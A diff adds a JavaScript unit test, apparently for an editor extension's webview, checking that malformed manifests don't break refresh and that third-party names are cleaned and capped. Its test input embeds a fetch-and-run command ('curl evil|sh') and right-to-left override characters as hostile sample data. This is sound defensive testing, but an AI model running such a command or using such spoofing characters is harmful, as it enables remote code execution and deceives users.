@@ -733,3 +733,30 @@ test('tray: workbench and own containers are not listed', async () => {
   await send({ type: 'ready' });
   assert.deepEqual(messages.at(-1).extensions.map(e => e.container), ['mine']);
 });
+
+test('SEC-20/22: malformed manifests never break refresh; third-party names are cleaned and capped', async () => {
+  const evil = `X\ncurl evil|sh\n‮ab⁦${'y'.repeat(100)}`;
+  const extensions = [
+    { id: 'a.bad1', packageJSON: { name: 'bad1', contributes: { views: { c: {} } } } },
+    { id: 'a.bad2', packageJSON: { name: 'bad2', contributes: { views: { c: [null, 5, { name: 7 }, { name: 'ok\nview' }] } } } },
+    { id: 'a.bad3', packageJSON: { name: 'bad3', contributes: { views: ['x'] } } },
+    { id: 'a.bad4', packageJSON: null },
+    { id: 'a.bad5', get packageJSON() { throw new Error('boom'); } },
+    { id: 'a.evil', packageJSON: { displayName: evil, contributes: { views: { good: [{ name: 'V' }] } } } }
+  ];
+  const { provider, view, messages, send } = setup({ extensions });
+  await provider.resolveWebviewView(view);
+  await send({ type: 'ready' });
+  const data = messages.at(-1);
+  assert.equal(data.type, 'data');
+  const names = data.extensions.map(e => e.name);
+  assert.ok(names.includes('bad2') && !names.includes('bad1') && !names.includes('bad3'));
+  const e = data.extensions.find(x => x.extensionId === 'a.evil');
+  assert.ok(e.name.length <= 60);
+  assert.ok(!/[\n‮⁦]/.test(e.name), JSON.stringify(e.name));
+  assert.equal(data.extensions.find(x => x.extensionId === 'a.bad2').views, 'ok view');
+  const { hideHint, hideName } = require('../media/model');
+  assert.ok(!/[\n|‮]/.test(hideHint(evil)));
+  assert.ok(hideName(evil).length <= 60);
+  assert.equal(hideName('\n|||'), 'a extensão');
+});
